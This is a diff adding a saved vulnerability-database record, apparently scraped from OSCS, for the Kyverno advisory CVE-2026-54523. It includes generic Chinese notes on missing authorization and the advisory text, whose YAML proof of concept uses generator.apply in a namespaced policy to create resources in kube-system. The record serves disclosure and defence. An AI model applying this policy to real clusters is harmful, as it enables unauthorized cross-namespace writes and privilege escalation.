@@ -1,0 +1,199 @@
+{
+  "saved_at": "2026-08-26T14:38:07+00:00",
+  "first_seen": true,
+  "translated": true,
+  "source_list": "https://www.oscs1024.com/oscs/v1/vdb/vuln_info",
+  "source_page": "https://www.oscs1024.com/hd/MPS-k8as-t0x5",
+  "detail": {
+    "analysis_status": 0,
+    "articles": [
+      {
+        "content": "- 程序中未正确实现授权机制，从而导致程序可以被未授权的用户访问或篡改",
+        "title": "什么是授权检查缺失"
+      },
+      {
+        "content": "- 伪造授权请求：攻击者可以通过发送伪造的授权请求来绕过授权验证，从而实现访问受保护的资源或数据。例如，攻击者可以通过伪造用户名和密码、证书等来模拟授权请求，从而绕过授权验证。\n- 命令注入攻击：攻击者可以通过在应用程序中注入恶意的命令来绕过授权验证，从而实现访问受保护的资源或数据。例如，攻击者可以通过在 Web 应用程序中注入恶意的命令来访问受保护的数据库或文件系统。\n- 文件包含攻击：攻击者可以通过在应用程序中包含恶意的文件，从而利用 Missing Authorization 漏洞来访问受保护的资源或数据。例如，攻击者可以通过在 Web 应用程序中包含恶意的 CSS 或 JavaScript 文件来欺骗应用程序将用户输入的数据执行为授权请求，从而绕过授权验证。\n- 拒绝服务攻击 (DDoS):攻击者可以通过向应用程序发送大量的请求来占用其资源，从而实现拒绝服务攻击。例如，攻击者可以通过向 Web 服务器发送大量的 HTTP 请求来占用其资源，从而使 Web 服务器无法正常响应合法的请求。\n",
+        "title": "授权检查缺失常见的攻击方式"
+      },
+      {
+        "content": "- 使用身份验证和授权机制：程序应该使用适当的身份验证和授权机制来验证用户的身份和权限，以确保只有授权用户可以访问受保护的资源或数据。\n- 最小特权原则：程序应该限制用户输入的数据的权限，只允许授权用户进行特定的操作，以减少未授权用户对受保护资源或数据的访问。\n- 输入验证：程序应该对用户输入的数据进行适当的验证和过滤，以确保输入的数据符合预期的格式和类型。\n- 安全编码实践：程序应该遵循一些安全编码实践，如使用安全的算法和加密机制、避免使用未认证的库和框架、避免使用默认设置等，以减少漏洞的出现。\n",
+        "title": "如何预防授权检查缺失"
+      }
+    ],
+    "cnvd_id": "",
+    "cve_id": "CVE-2026-54523",
+    "cvss": {
+      "cvssv31": [
+        {
+          "source": "github_advisory",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N",
+          "severity": "critical",
+          "base_score": 9.6
+        }
+      ]
+    },
+    "cvss_score": 9.6,
+    "cvss_vector": "",
+    "cwe": "CWE-862",
+    "description": "## Summary\n\nIn Kyverno v1.18.1, a tenant who can create a `NamespacedMutatingPolicy` in their own namespace can instruct the admission controller to generate resources in any namespace by passing an arbitrary namespace string to the CEL `generator.apply(namespace, resources)` function.\n\n## Details\n\n`pkg/cel/libs/context.go:177` declares `GenerateResources(namespace string, dataList []map[string]any)`. The `namespace` argument arrives unvalidated from the CEL expression `generator.apply(\"<target-namespace>\", [...])`.\n\n### Version-Specific Impact\n\n**v1.18.0, v1.18.1 (affected via NamespacedMutatingPolicy only):**\n\nThe nmpol CEL compiler unintentionally exposes the `generator` library to match condition expressions. A namespaced mutating policy can invoke `generator.apply()` in a boolean CEL expression such as `matchConditions`, triggering the admission controller to generate resources in any namespace at request time. This side effect executes with the admission controller's cluster-wide privileges.\n\nNamespacedGeneratingPolicy is **not** a vector in v1.18.1 due to incomplete webhook and background processing wiring (not registered or functional).\n\n### Root Cause\n\nThe admission validator for `NamespacedMutatingPolicy` (`pkg/cel/policies/mpol/validate.go`) only checks that the policy compiles and does not enforce namespace scope on `generator.apply()` arguments.\n\nCompare correctly-guarded equivalents: `pkg/engine/context/loaders/configmap.go:102` rejects cross-namespace ConfigMap references for namespaced policies, and `pkg/engine/apicall/apicall.go:73-82` enforces namespace segment matching. `GenerateResources` has neither guard.\n\n## Proof of Concept\n\nPrerequisites: namespace `tenant-ns` exists; attacker has `create` on `namespacedmutatingpolicies.policies.kyverno.io` in `tenant-ns`.\n\n```yaml\napiVersion: policies.kyverno.io/v1beta1\nkind: NamespacedMutatingPolicy\nmetadata:\n  name: cross-ns-escalate\n  namespace: tenant-ns\nspec:\n  matchConstraints:\n    resourceRules:\n    - apiGroups: [\"\"]\n      apiVersions: [\"v1\"]\n      resources: [\"configmaps\"]\n      operations: [\"CREATE\"]\n  mutations:\n  - patchType: applyConfiguration\n    applyConfiguration:\n      expression: object\n  matchConditions:\n  - name: trigger-escalation\n    expression: |\n      generator.apply(\"kube-system\", [\n        {\n          \"apiVersion\": dyn(\"v1\"),\n          \"kind\": dyn(\"ConfigMap\"),\n          \"metadata\": dyn({\n            \"name\": \"kube-system-config\",\n            \"namespace\": \"kube-system\"\n          }),\n          \"data\": dyn({\n            \"injected-by\": \"tenant-policy\",\n            \"impact\": \"unauthorized access to kube-system namespace\"\n          })\n        }\n      ])\n```\n\nApply the policy, then create any ConfigMap in `tenant-ns` to trigger the admission webhook. The admission controller creates `configmap/kube-system-config` in `kube-system`. By default, the admission controller has `create` on ConfigMaps in all namespaces.\n\n## Impact\n\nA namespace-scoped user with `create` on `NamespacedMutatingPolicy` in >=v1.18.1 can create ConfigMaps, NetworkPolicies, Secrets, and other resources in any namespace using the admission controller's cluster-wide RBAC. This allows:\n\nInjecting sensitive configuration into protected namespaces (e.g., `kube-system`, `default`)\nDisrupting cluster networking via NetworkPolicies\nPrivilege escalation via RoleBinding creation (for roles the admission controller holds or lesser-privileged roles)\nPrivilege escalation via RoleBinding creation in other namespaces\nAny installation that grants non-admin users access to `NamespacedMutatingPolicy` creation is affected.\n\n## Timeline\n\n* 2026-05-20: Vulnerability reproduced on main\n* 2026-07-13: CVE-2026-54523 / GHSA-79gf-7frw-68m9 published\n* 2026-07-22: Advisory clarified to document actual v1.18.1 attack vector (NamespacedMutatingPolicy in matchConditions, not NamespacedGeneratingPolicy)\n\n## Advisory Update\n\nThis advisory was updated to clarify the v1.18.1 attack surface. The nmpol vector in matchConditions was the reachable attack path in v1.18.1, while ngpol lacked end-to-end plumbing. The CVE, patched version, and CVSS score remain unchanged. Original report by @0xVijay.",
+    "effects": [
+      {
+        "comp_name": "github.com/kyverno/kyverno",
+        "ecosystem": "go",
+        "versions": [
+          {
+            "affected_version": "[v1.18.0,v1.18.2)",
+            "min_fixed_version": "v1.18.2",
+            "repository": "go",
+            "solutions": [],
+            "upstream": true
+          }
+        ]
+      }
+    ],
+    "epss": -1,
+    "exp": false,
+    "exploit_requirement": "",
+    "exploit_requirement_cost": "",
+    "exploitability": "中",
+    "fix_suggestion": "可选修复",
+    "kind": "授权检查缺失",
+    "kind_en": "缺少授权",
+    "last_modified_time": "2026-08-26",
+    "level": "Critical",
+    "mps_id": "MPS-k8as-t0x5",
+    "poc": false,
+    "poc_url": [],
+    "published_time": "2026-08-26",
+    "reference_url_list": [
+      {
+        "url": "https://github.com/kyverno/kyverno/security/advisories/GHSA-79gf-7frw-68m9",
+        "name": ""
+      },
+      {
+        "url": "https://github.com/kyverno/kyverno/pull/16238",
+        "name": ""
+      },
+      {
+        "url": "https://github.com/kyverno/kyverno/commit/0919553c0ea1904f8d891280c92018da97946a06",
+        "name": ""
+      },
+      {
+        "url": "https://github.com/kyverno/kyverno/commit/5164bcdeda5b57678bc2d7a03ecc2cbb02982dae",
+        "name": ""
+      },
+      {
+        "url": "https://github.com/kyverno/sdk/commit/6573937441443e1ba5af9fbb28d5c0f20297f9df",
+        "name": ""
+      },
+      {
+        "url": "https://github.com/kyverno/kyverno/releases/tag/v1.18.2",
+        "name": ""
+      },
+      {
+        "url": "https://github.com/advisories/GHSA-79gf-7frw-68m9",
+        "name": ""
+      }
+    ],
+    "scope_influence": "",
+    "tags": [],
+    "title": "Kyverno's NamespacedGeneratingPolicy generator.apply() namespace argument unvalidated -- background controller creates RoleBindings in any namespace including kube-system",
+    "_translated": true
+  },
+  "detail_original": {
+    "analysis_status": 0,
+    "articles": [
+      {
+        "content": "- 程序中未正确实现授权机制，从而导致程序可以被未授权的用户访问或篡改",
+        "title": "什么是授权检查缺失"
+      },
+      {
+        "content": "- 伪造授权请求：攻击者可以通过发送伪造的授权请求来绕过授权验证，从而实现访问受保护的资源或数据。例如，攻击者可以通过伪造用户名和密码、证书等来模拟授权请求，从而绕过授权验证。\n- 命令注入攻击：攻击者可以通过在应用程序中注入恶意的命令来绕过授权验证，从而实现访问受保护的资源或数据。例如，攻击者可以通过在 Web 应用程序中注入恶意的命令来访问受保护的数据库或文件系统。\n- 文件包含攻击：攻击者可以通过在应用程序中包含恶意的文件，从而利用 Missing Authorization 漏洞来访问受保护的资源或数据。例如，攻击者可以通过在 Web 应用程序中包含恶意的 CSS 或 JavaScript 文件来欺骗应用程序将用户输入的数据执行为授权请求，从而绕过授权验证。\n- 拒绝服务攻击 (DDoS):攻击者可以通过向应用程序发送大量的请求来占用其资源，从而实现拒绝服务攻击。例如，攻击者可以通过向 Web 服务器发送大量的 HTTP 请求来占用其资源，从而使 Web 服务器无法正常响应合法的请求。\n",
+        "title": "授权检查缺失常见的攻击方式"
+      },
+      {
+        "content": "- 使用身份验证和授权机制：程序应该使用适当的身份验证和授权机制来验证用户的身份和权限，以确保只有授权用户可以访问受保护的资源或数据。\n- 最小特权原则：程序应该限制用户输入的数据的权限，只允许授权用户进行特定的操作，以减少未授权用户对受保护资源或数据的访问。\n- 输入验证：程序应该对用户输入的数据进行适当的验证和过滤，以确保输入的数据符合预期的格式和类型。\n- 安全编码实践：程序应该遵循一些安全编码实践，如使用安全的算法和加密机制、避免使用未认证的库和框架、避免使用默认设置等，以减少漏洞的出现。\n",
+        "title": "如何预防授权检查缺失"
+      }
+    ],
+    "cnvd_id": "",
+    "cve_id": "CVE-2026-54523",
+    "cvss": {
+      "cvssv31": [
+        {
+          "source": "github_advisory",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N",
+          "severity": "critical",
+          "base_score": 9.6
+        }
+      ]
+    },
+    "cvss_score": 9.6,
+    "cvss_vector": "",
+    "cwe": "CWE-862",
+    "description": "## Summary\n\nIn Kyverno v1.18.1, a tenant who can create a `NamespacedMutatingPolicy` in their own namespace can instruct the admission controller to generate resources in any namespace by passing an arbitrary namespace string to the CEL `generator.apply(namespace, resources)` function.\n\n## Details\n\n`pkg/cel/libs/context.go:177` declares `GenerateResources(namespace string, dataList []map[string]any)`. The `namespace` argument arrives unvalidated from the CEL expression `generator.apply(\"<target-namespace>\", [...])`.\n\n### Version-Specific Impact\n\n**v1.18.0, v1.18.1 (affected via NamespacedMutatingPolicy only):**\n\nThe nmpol CEL compiler unintentionally exposes the `generator` library to match condition expressions. A namespaced mutating policy can invoke `generator.apply()` in a boolean CEL expression such as `matchConditions`, triggering the admission controller to generate resources in any namespace at request time. This side effect executes with the admission controller's cluster-wide privileges.\n\nNamespacedGeneratingPolicy is **not** a vector in v1.18.1 due to incomplete webhook and background processing wiring (not registered or functional).\n\n### Root Cause\n\nThe admission validator for `NamespacedMutatingPolicy` (`pkg/cel/policies/mpol/validate.go`) only checks that the policy compiles and does not enforce namespace scope on `generator.apply()` arguments.\n\nCompare correctly-guarded equivalents: `pkg/engine/context/loaders/configmap.go:102` rejects cross-namespace ConfigMap references for namespaced policies, and `pkg/engine/apicall/apicall.go:73-82` enforces namespace segment matching. `GenerateResources` has neither guard.\n\n## Proof of Concept\n\nPrerequisites: namespace `tenant-ns` exists; attacker has `create` on `namespacedmutatingpolicies.policies.kyverno.io` in `tenant-ns`.\n\n```yaml\napiVersion: policies.kyverno.io/v1beta1\nkind: NamespacedMutatingPolicy\nmetadata:\n  name: cross-ns-escalate\n  namespace: tenant-ns\nspec:\n  matchConstraints:\n    resourceRules:\n    - apiGroups: [\"\"]\n      apiVersions: [\"v1\"]\n      resources: [\"configmaps\"]\n      operations: [\"CREATE\"]\n  mutations:\n  - patchType: applyConfiguration\n    applyConfiguration:\n      expression: object\n  matchConditions:\n  - name: trigger-escalation\n    expression: |\n      generator.apply(\"kube-system\", [\n        {\n          \"apiVersion\": dyn(\"v1\"),\n          \"kind\": dyn(\"ConfigMap\"),\n          \"metadata\": dyn({\n            \"name\": \"kube-system-config\",\n            \"namespace\": \"kube-system\"\n          }),\n          \"data\": dyn({\n            \"injected-by\": \"tenant-policy\",\n            \"impact\": \"unauthorized access to kube-system namespace\"\n          })\n        }\n      ])\n```\n\nApply the policy, then create any ConfigMap in `tenant-ns` to trigger the admission webhook. The admission controller creates `configmap/kube-system-config` in `kube-system`. By default, the admission controller has `create` on ConfigMaps in all namespaces.\n\n## Impact\n\nA namespace-scoped user with `create` on `NamespacedMutatingPolicy` in >=v1.18.1 can create ConfigMaps, NetworkPolicies, Secrets, and other resources in any namespace using the admission controller's cluster-wide RBAC. This allows:\n\nInjecting sensitive configuration into protected namespaces (e.g., `kube-system`, `default`)\nDisrupting cluster networking via NetworkPolicies\nPrivilege escalation via RoleBinding creation (for roles the admission controller holds or lesser-privileged roles)\nPrivilege escalation via RoleBinding creation in other namespaces\nAny installation that grants non-admin users access to `NamespacedMutatingPolicy` creation is affected.\n\n## Timeline\n\n* 2026-05-20: Vulnerability reproduced on main\n* 2026-07-13: CVE-2026-54523 / GHSA-79gf-7frw-68m9 published\n* 2026-07-22: Advisory clarified to document actual v1.18.1 attack vector (NamespacedMutatingPolicy in matchConditions, not NamespacedGeneratingPolicy)\n\n## Advisory Update\n\nThis advisory was updated to clarify the v1.18.1 attack surface. The nmpol vector in matchConditions was the reachable attack path in v1.18.1, while ngpol lacked end-to-end plumbing. The CVE, patched version, and CVSS score remain unchanged. Original report by @0xVijay.",
+    "effects": [
+      {
+        "comp_name": "github.com/kyverno/kyverno",
+        "ecosystem": "go",
+        "versions": [
+          {
+            "affected_version": "[v1.18.0,v1.18.2)",
+            "min_fixed_version": "v1.18.2",
+            "repository": "go",
+            "solutions": [],
+            "upstream": true
+          }
+        ]
+      }
+    ],
+    "epss": -1,
+    "exp": false,
+    "exploit_requirement": "",
+    "exploit_requirement_cost": "",
+    "exploitability": "中",
+    "fix_suggestion": "Optional",
+    "kind": "授权检查缺失",
+    "kind_en": "Missing Authorization",
+    "last_modified_time": "2026-08-26",
+    "level": "Critical",
+    "mps_id": "MPS-k8as-t0x5",
+    "poc": false,
+    "poc_url": [],
+    "published_time": "2026-08-26",
+    "reference_url_list": [
+      {
+        "url": "https://github.com/kyverno/kyverno/security/advisories/GHSA-79gf-7frw-68m9",
+        "name": ""
+      },
+      {
+        "url": "https://github.com/kyverno/kyverno/pull/16238",
+        "name": ""
+      },
+      {
+        "url": "https://github.com/kyverno/kyverno/commit/0919553c0ea1904f8d891280c92018da97946a06",
+        "name": ""
+      },
+      {
+        "url": "https://github.com/kyverno/kyverno/commit/5164bcdeda5b57678bc2d7a03ecc2cbb02982dae",
+        "name": ""
+      },
+      {
+        "url": "https://github.com/kyverno/sdk/commit/6573937441443e1ba5af9fbb28d5c0f20297f9df",
+        "name": ""
+      },
+      {
+        "url": "https://github.com/kyverno/kyverno/releases/tag/v1.18.2",
+        "name": ""
+      },
+      {
+        "url": "https://github.com/advisories/GHSA-79gf-7frw-68m9",
+        "name": ""
+      }
+    ],
+    "scope_influence": "",
+    "tags": [],
+    "title": "Kyverno's NamespacedGeneratingPolicy generator.apply() namespace argument unvalidated -- background controller creates RoleBindings in any namespace including kube-system"
+  },
+  "first_saved_at": "2026-08-26T14:38:06+00:00"
+}
